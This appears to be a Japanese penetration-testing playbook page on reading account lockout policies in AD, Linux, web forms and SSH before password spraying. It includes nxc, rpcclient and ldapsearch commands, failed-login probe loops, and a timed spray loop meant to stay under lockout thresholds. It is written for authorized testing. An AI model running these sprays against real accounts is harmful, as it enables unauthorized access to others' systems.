# アカウントロックアウトポリシーの事前確認

> **スコープ**: 辞書攻撃・パスワードスプレー・デフォルト認証情報試行を **始める前に** ロックアウト閾値・期間・観察期間を確認するための手順を集約する。**「何回失敗で何分ロックされるか」を試行前に取得する技術** だけを扱う。

## 着火条件

以下のいずれかに該当した時点で、認証試行系の作業より先にこのファイルを開く：

- パスワードスプレー / 辞書攻撃を始める直前。試行設計（並列度・試行間隔・試行上限）を作るための前提情報が必要
- `Default_Credentials.md` を流す前に、製品が独自にロックアウト機構を持っているか確認したい
- AD 環境のドメインユーザーに対して認証試行を行う場合（**ドメインポリシーで全アカウントに同じロックアウトが効く**）
- Web フォームに対する辞書攻撃前で、フォーム側のロックアウト or IP ブロックがあるか不明

## 環境前提

- 実行環境: テスター端末（Linux）および場合によってはターゲット（シェルあり）
- 必要なツール:
  - `nxc`（NetExec の CLI ラッパー、ペネトレ用 Linux ディストリ標準。`--pass-pol` で AD ドメインポリシー取得。詳細は `../05_Tools_Reference/Netexec.md`）
  - `rpcclient`（Samba スイート同梱、ペネトレ用 Linux ディストリ標準。`getdompwinfo` でパスワードポリシー確認）
  - `impacket-samrdump`（Impacket スイート同梱、ペネトレ用 Linux ディストリ標準。SAMR 経由でパスワードポリシーを取得）
  - `ldapsearch`（OpenLDAP クライアント、標準搭載）
  - `curl`（標準搭載。Web フォームの応答差分観察）
  - ターゲット側で実行する場合: `net accounts`（Windows 標準）/ `faillock`・`pam_tally2`（Linux 標準）
- オフライン代替: すべて標準搭載または Impacket 配下のツールで完結

## 先に確認すること

- **対象が AD ドメインメンバーかスタンドアロンか**: スタンドアロンはローカル SAM のポリシー（`net accounts`）を持ち、AD とは別系統
- **対象が Web アプリの場合、ロックアウトがどのレイヤーで効いているか**: アプリ自体（DB 側のフラグ）/ 前段の WAF（IP ベース）/ リバースプロキシ（Rate limiting）
- **「ロックアウト閾値 0」は無効化を意味する**: AD では `0` が「ロックしない」設定

**攻撃者の思考トレース:** ロックアウト閾値を知らずに辞書攻撃すると、本物のドメインユーザーまで巻き添えで締め出される。**「閾値を取りに行く」一手は、辞書攻撃そのものより優先順位が高い。** 取れない場合はもっとも保守的な前提（閾値 3、観察期間 30 分）で試行設計する。

> 原理（なぜ「列挙」は badPwdCount を増やさず、「認証試行」だけがロックアウトを発動させるか・SAMR / LSAT の読み取りメソッドと DCERPC BIND の境界）→ `../06_Concepts/RPC_Enumeration_Internals.md` §5

**ロックアウトポリシーの 4 軸（AD・Linux・Web 共通）：**

| 軸 | AD での名称 | 意味 | 試行設計への影響 |
|----|----------|-----|--------------|
| ロックアウト閾値 | `lockoutThreshold` | 連続失敗が何回でロックされるか | 1 アカウントあたりの試行は (閾値 - 1) 回までに留める |
| ロックアウト期間 | `lockoutDuration` | ロック後何分で自動解除されるか | 0 分 = 管理者解除のみ。1 分以上 = 待てば次サイクルで再試行可能 |
| 観察期間（リセットタイマー） | `lockOutObservationWindow` | 失敗カウンタが何分でゼロに戻るか | この時間以上の試行間隔を空ければ閾値超過しない |
| 失敗カウンタ | （状態） | 現在の失敗回数 | アカウントごとに別カウント。スプレーが 1 アカウント 1 回なら閾値到達しにくい |

---

## 1. AD のドメインポリシーを取得する

**コマンド（認証情報あり — 推奨）:**

```bash
# [Attacker] nxc smb の --pass-pol（最も簡潔）
nxc smb [TARGET] -u [USER] -p '[PASSWORD]' --pass-pol
# 出力例:
#   Account lockout threshold: 5        ← ロックアウト閾値
#   Account lockout duration: 30 minutes ← ロックアウト期間
#   Reset Account Lockout Counter: 30 minutes  ← 観察期間

# [Attacker] rpcclient（認証あり）
rpcclient -U "[USER]%[PASSWORD]" [TARGET]
rpcclient $> getdompwinfo
rpcclient $> querydominfo

# [Attacker] Impacket samrdump（SAMR プロトコル経由）
impacket-samrdump '[DOMAIN]/[USER]:[PASSWORD]@[TARGET]'

# [Attacker] LDAP 経由でドメインルート属性を取得
ldapsearch -x -H ldap://[TARGET] -D "[USER]@[DOMAIN]" -w '[PASSWORD]' \
  -b "DC=[DOMAIN_DC],DC=[TLD]" -s base \
  lockoutThreshold lockoutDuration lockOutObservationWindow
# lockoutDuration の値は 100 ナノ秒単位の負数: 絶対値 / 10000000 / 60 = 分
# 例: 18000000000 / 10000000 / 60 = 30 分
```

**コマンド（認証情報なし — 限定的）:**

```bash
# [Attacker] rpcclient 匿名（古い Windows Server 2008 R2 以前は通る場合あり）
rpcclient -U "" -N [TARGET]
rpcclient $> getdompwinfo
# パスワードプロパティのみ返ることが多く、ロックアウト情報は取れないことが多い
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `Account lockout threshold: 0` | ロックアウト無効化 | 並列度を上げて試行可能（ただし SIEM 検知はあり得る） |
| `Account lockout threshold: 3` 以下 | 厳格運用 | 1 アカウントあたり最大 2 試行、観察期間以上の間隔で 2 サイクル目へ |
| `Account lockout threshold: 5～10` | 一般的設定 | 1 アカウントあたり最大 (閾値 - 2) 試行に留める |
| `Account lockout duration: -1` / `Forever` | 解除に管理者操作必須 | **絶対にロックさせない設計が必要** |
| `STATUS_ACCESS_DENIED` | 認証ユーザーにポリシー読み取り権限なし | §3 へ（別ユーザーで取得）またはポリシー不明の保守的前提で設計 |

**注意:** FGPP（Fine-Grained Password Policy）でターゲットユーザーに別ポリシーが効いていないか確認する:

```bash
# [Target] FGPP の確認（PowerShell + RSAT）
Get-ADFineGrainedPasswordPolicy -Filter *
```

---

## 2. ターゲット上でポリシーを確認する（シェルあり）

**コマンド（Windows）:**

```cmd
# [Target] ローカル SAM のポリシー
net accounts

# [Target] ドメインのポリシー
net accounts /domain
# 出力例:
#   ロックアウトのしきい値: 5
#   ロックアウト期間 (分): 30
#   ロックアウトの監視ウィンドウ (分): 30
```

```bash
# [Target] 個別ユーザーの badPwdCount / lockoutTime の確認
ldapsearch ... "(sAMAccountName=[TARGET_USER])" \
  badPwdCount lockoutTime userAccountControl
# badPwdCount: 現在の失敗回数（観察期間内の累積）
# lockoutTime: 0 ならロックされていない、0 以外ならロック中（FILETIME 形式）
```

**コマンド（Linux）:**

```bash
# [Target] PAM 設定の確認（pam_faillock / pam_tally2 が含まれているか）
grep -r "pam_tally2\|pam_faillock" /etc/pam.d/

# [Target] pam_faillock の設定値（モダン Linux）
grep -r "deny\|unlock_time\|fail_interval" /etc/security/faillock.conf 2>/dev/null

# [Target] 現在の失敗カウンタ
faillock --user [TARGET_USER]
pam_tally2 --user [TARGET_USER]    # 古いシステム

# [Target] アカウントの状態
passwd -S [TARGET_USER]
# 出力 2 列目: L = locked / P = usable / NP = no password
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `pam_faillock` が pam.d に含まれる | Linux アカウント単位のロックあり | `faillock --user [USER]` で現在の失敗カウンタを確認 |
| `passwd -S` 出力の 2 列目が `L` | アカウントがロック済み | 管理者にアンロックを依頼（本番では対象組織へ報告） |
| `badPwdCount` が閾値の 1 手前 | 次の試行でロックする可能性が高い | **そのアカウントへの試行を一時停止**し、観察期間経過を待つ |

---

## 3. Web アプリのロックアウト・IP ブロックを観察する

**事前準備（必須）:** 観察試行は **事前合意で許容されたテストアカウント** のみに絞る。本物のユーザーアカウントを使わない。

**コマンド:**

```bash
# [Attacker] テストアカウントで 5〜10 回失敗を入れて挙動観察
for i in $(seq 1 10); do
  res=$(curl -s -X POST http://[TARGET]/login \
    -d "user=[TEST_USER]&pass=invalid_${i}" \
    -w "\nHTTP=%{http_code} TIME=%{time_total} SIZE=%{size_download}\n" -o /tmp/body_${i})
  echo "=== try $i ==="
  echo "$res" | tail -1
  sleep 2
done
```

**観測される出力 → 次のアクション:**

| パターン | 観察 | 推定 | 試行設計 |
|--------|------|-----|--------|
| A | レスポンスがずっと同じ | 制限なし or 大きい閾値 | スプレー進行可 |
| B | N 回目から captcha / 多要素チャレンジ | 段階制限 | 自動化は N - 1 回まで |
| C | N 回目から HTTP 429 / Retry-After | Rate limiting | Retry-After 値以上の間隔で再開可 |
| D | N 回目から接続切断 / 別ページにリダイレクト | IP ブロック発動 | 同 IP では当面試行不可 |

**注意:** HTTP レスポンスヘッダーで `Retry-After: 60` / `X-RateLimit-Remaining: 0` / `Set-Cookie: lockout=1` を確認する。

---

## 4. SSH のロックアウト・fail2ban を観察する

SSH 自体は標準ではロックアウト機構を持たない。`fail2ban` / `pam_faillock` / `sshd_config` の `MaxAuthTries` のいずれかで実装される。

**コマンド:**

```bash
# [Attacker] 試行回数 → 接続切断パターンの観察
for i in $(seq 1 8); do
  echo "=== attempt $i ==="
  sshpass -p "invalid_${i}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    [TEST_USER]@[TARGET] true 2>&1 | head -3
  sleep 1
done

# [Attacker] N 回連続失敗後に接続がタイムアウト → fail2ban で IP BAN の可能性
nmap -p 22 [TARGET]
# filtered → fail2ban の iptables rule で DROP されている
```

**観測される出力 → 次のアクション:**

| 機構 | 効果範囲 | 試行設計上の意味 |
|----|--------|--------------|
| `MaxAuthTries` (sshd_config) | 1 接続内の試行上限（既定 6） | 1 接続で 6 試行できる。再接続で再カウント、IP BAN なし |
| `fail2ban` | 期間内の失敗を集計 → 期間 BAN | BAN 期間中は接続自体不可。IP を変えるか期間待ち |
| `pam_faillock` (sshd) | アカウント単位の累積失敗 | アカウントロック。IP 変更では迂回できない |

---

## 5. 試行間隔の設計（ロックアウト閾値が判明した後）

**設計式:**

```
1 アカウントへの試行回数 < 閾値（保守的に閾値 - 2）
試行サイクル間隔 > 観察期間（保守的に観察期間 + 5 分）
```

**コマンド:**

```bash
# [Attacker] nxc でのスプレー（1 アカウント 1 試行・サイクル間隔を sleep で制御）
nxc smb [TARGET] -u users.txt -p '[SPRAY_PW1]' --continue-on-success

# 複数パスワードのサイクル（観察期間以上の間隔を挟む）
for pw in '[SPRAY_PW1]' '[SPRAY_PW2]'; do
  nxc smb [TARGET] -u users.txt -p "$pw" --continue-on-success
  echo "Sleeping 35 minutes (observation window + buffer)..."
  sleep 2100   # 35 分
done
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `(Pwn3d!)` | 認証成功 + 管理者権限 | WinRM / SMB でシェル取得へ |
| `STATUS_LOGON_FAILURE` | パスワード不一致（ロックではない） | 次パスワードのサイクルを待ってから再試行 |
| `STATUS_ACCOUNT_LOCKED_OUT` | ロックアウト発動 | **即停止** → 該当アカウントはロックアウト期間後に試行再開 |

**注意:** `badPwdCount` は DC ごとに同期しない（PDC エミュレータに集約される）。1 つの DC で badPwdCount が低くても、PDC 側では閾値に近づいている可能性がある。

---

## 刺さらなかったとき

| 観測される症状 | 推定原因 | 対処 |
|--------------|---------|------|
| `nxc smb --pass-pol` が `STATUS_ACCESS_DENIED` | 認証ユーザーにポリシー読み取り権限なし | 別の認証情報を取得、または LDAP 匿名でドメインルート属性を試す |
| 匿名 rpcclient で `getdompwinfo` がエラー | NULL セッション無効化 | 認証情報取得を待つ。ポリシー不明前提（閾値 3、観察期間 30 分）で保守的に設計 |
| Web で観察した N 回失敗後の挙動が毎回違う | サーバー側の応答にランダム要素 | Cookie / トークンを毎回取り直して試行、複数セッションで観察 |
| FGPP（細粒度パスワードポリシー）の有無が不明 | ドメイン既定ポリシーと別系統 | `Get-ADFineGrainedPasswordPolicy` 必須。RSAT が無いマシンでは LDAP の `msDS-PasswordSettings` クラスを直接列挙 |
| `LDAP lockoutDuration: 0` | ドメイン既定で「ロックアウトなし」 | スプレーの並列度を上げて良いが、4625 ログは大量発生する点に注意 |

---

## 注意点・落とし穴

> **[HIGH IMPACT]** ロックアウト確認自体は読み取り操作で業務影響は無いが、**この確認を怠ったままスプレー / 辞書攻撃に入ると業務停止につながる**。本番では必ず本ファイルの手順を踏んでから認証試行を行う。

- **FGPP でターゲットユーザーに別ポリシーが効いていないか必ず確認する**: ドメイン既定より厳しいロックアウトが特定グループに適用されている可能性がある
- **「観察期間 ≠ ロックアウト期間」**: 観察期間（リセットタイマー）が切れる前に閾値到達 → ロック。**試行設計には観察期間の方を使う**
- **「ロックアウト閾値 0 = ロックなし」だが SIEM 検知はある**: ロックなし ≠ 検知なし
- **Web アプリ側ロックアウトは UI に表示されないことが多い**: 裏で badPwdCount を上げているアプリがある。観察試行は事前合意で許容されたテストアカウントに絞る
- **観察試行で本物のユーザーアカウントを使わない**: 事前合意されたテスト用アカウントで観察し、本物のユーザーへのスプレーは設計確定後に行う

---

### 本番での前提

- **事前合意の要否**: ★★（口頭確認可）。ロックアウト確認自体は読み取り操作で業務影響なし。ただし観察試行でテストアカウント以外を使う場合は ★★★
- **想定される SIEM / EDR 検知**:
  - `--pass-pol` / `samrdump` は SAMR プロトコル経由のドメイン情報取得 → Event ID 4661 として記録される可能性
  - LDAP 直叩きは Event ID 1644（LDAP 検索クエリ）が有効化されている環境で記録
  - 観察試行（意図的失敗）は通常のログイン失敗と同じ Event ID 4625
- **業務影響リスク**: 確認手順自体はなし。観察試行で本物のユーザー名を使った場合のみ失敗カウンタを進めるリスク
- **原状回復必須項目**: ✅ 観察試行で進めた `badPwdCount` の自然減（観察期間経過待ち）またはリセット依頼 / ✅ 取得したポリシー情報の暗号化保管
- **取得情報の取扱**: ロックアウトポリシー値は試行設計用の内部資料、テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：SMB 経由の匿名列挙の延長で `--pass-pol` → `../01_Reconnaissance/SMB_Enumeration.md`
- 前：LDAP 認証取得後にドメインルート属性を取得 → `../01_Reconnaissance/LDAP_Enumeration.md`
- 前：SSH 対応認証方式の確認（`publickey` のみならスプレー不要）→ `./SSH.md`
- 後：ポリシー確定後にデフォルト認証情報試行へ → `./Default_Credentials.md`
- 後：SSH / FTP / WinRM の試行設計に反映 → `./SSH.md`・`./FTP.md`・`./WinRM.md`
- 後：`--continue-on-success` / sleep 設計の詳細 → `../05_Tools_Reference/Netexec.md`
